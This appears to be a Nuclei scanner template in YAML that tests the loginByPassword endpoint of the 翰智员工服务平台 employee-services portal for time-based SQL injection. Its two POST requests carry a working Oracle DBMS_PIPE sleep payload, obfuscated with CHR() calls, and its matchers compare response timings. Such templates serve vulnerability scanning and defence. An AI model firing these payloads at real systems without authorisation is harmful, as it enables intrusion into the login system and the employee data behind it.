id: hanzhi-loginbypassword-sqli
info:
  name: 翰智员工服务平台 loginByPassword SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 翰智员工服务平台
  description: |
    翰智员工服务平台 loginByPassword endpoint is vulnerable to SQL injection, allowing unauthorized access or exploitation.

http:
  - raw:
      - |
        POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"userName":"'||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE 7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),5))||'","password":"'"}
      - |
        POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"userName":"'||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE 7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),8))||'","password":"'"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"loginSuccess":false'
        negative: false
      - type: word
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
